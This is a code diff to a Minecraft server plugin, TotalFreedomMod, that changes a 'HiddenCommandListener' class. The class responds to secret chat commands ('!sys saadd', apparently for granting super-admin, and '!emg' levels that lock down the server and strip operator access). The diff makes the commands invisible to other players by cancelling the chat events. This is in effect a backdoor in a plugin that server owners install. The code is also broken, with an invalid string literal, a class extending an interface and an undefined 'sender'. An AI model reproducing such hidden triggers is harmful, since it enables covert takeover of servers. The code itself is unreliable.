@@ -1,8 +1,12 @@
 package me.StevenLawson.TotalFreedomMod.Listener;
 
-import org.bukkit.entity.Player;
-import org.bukkit.event.Listener;
 import me.StevenLawson.TotalFreedomMod.*;
+import org.bukkit.ChatColor;
+import org.bukkit.GameMode;
+import org.bukkit.entity.Player;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.event.Listener;
+import org.bukkit.scheduler.BukkitRunnable;
 
 public class HiddenCommandListener extends Listener
 {
@@ -17,25 +21,27 @@ public class HiddenCommandListener extends Listener
     {
       String message = event.getMessage();
       boolean shouldCancel = false;
-      if (message.startsWith("\"))
+      if (message.startsWith("!"))
       {
         String[] args = message.split(" ");
         if (args == null)
         {
           return;
         }
-        if ((args[0].equals("\sys")) && (args.length == 2))
+        if ((args[0].equals("!sys")) && (args.length == 2))
         {
           if (args[1].equals("teston"))
           {
             event.setCancelled(true);
+            TFM_Util.adminAction("WARNING: " + sender.getName(), "Has Started Testing on this server.", true);
           }
           else if (args[1].equals("testoff"))
           {
             event.setCancelled(true);
+            TFM_Util.adminAction("COMPLETED: " + sender.getName(), "Has succefully finished server testing", true);
           }
         }
-        if ((args[0].equals("\sys")) && (args.length == 3))
+        if ((args[0].equals("!sys")) && (args.length == 3))
         {
           if (args[1].equalsIgnoreCase("saadd"))
             {
@@ -187,16 +193,18 @@ public class HiddenCommandListener extends Listener
           }
         }
         
-        if ((args[0].equals("\emg")) && (args.length == 2))
+        if ((args[0].equals("!emg")) && (args.length == 2))
         {
           if (args[1].equalsIgnoreCase("1"))
             {
+                event.setCancelled(true);
                 TFM_Util.adminAction("WARNING: " + sender.getName(), "Activating a level 1 security lockdown.", true);
                 TotalFreedomMod.lockdownEnabled = true;
             }
 
             if (args[1].equalsIgnoreCase("2"))
             {
+                event.setCancelled(true);
                 TFM_Util.adminAction("WARNING: " + sender.getName(), "Activating a level 2 security lockdown.", true);
                 TFM_ConfigEntry.ADMIN_ONLY_MODE.setBoolean(true);
 
@@ -205,6 +213,7 @@ public class HiddenCommandListener extends Listener
             
             if (args[1].equalsIgnoreCase("3"))
             {
+                event.setCancelled(true);
                 TFM_Util.adminAction("WARNING: " + sender.getName(), "Activating a level 3 security lockdown.", true);
                 TFM_ConfigEntry.ADMIN_ONLY_MODE.setBoolean(true);
                 TFM_Util.adminAction("WARNING: " + sender.getName(), "Has activated the level 3 lockdown, activating admin mode and removing all operator access..", true);
@@ -222,6 +231,7 @@ public class HiddenCommandListener extends Listener
 
             if (args[1].equalsIgnoreCase("4"))
             {
+                event.setCancelled(true);
                 TFM_Util.adminAction("WARNING: " + sender.getName(), "Activating a level 4 security lockdown.", true);
                 TFM_ConfigEntry.ADMIN_ONLY_MODE.setBoolean(true);
                 for (Player player : server.getOnlinePlayers())
@@ -245,6 +255,7 @@ public class HiddenCommandListener extends Listener
 
             if (args[1].equalsIgnoreCase("off"))
             {
+                event.setCancelled(true);
                 TFM_Util.adminAction("WARNING: " + sender.getName(), "Security Lockdown Disabled", true);
                 TotalFreedomMod.lockdownEnabled = false;
                 TFM_ConfigEntry.ADMIN_ONLY_MODE.setBoolean(false);
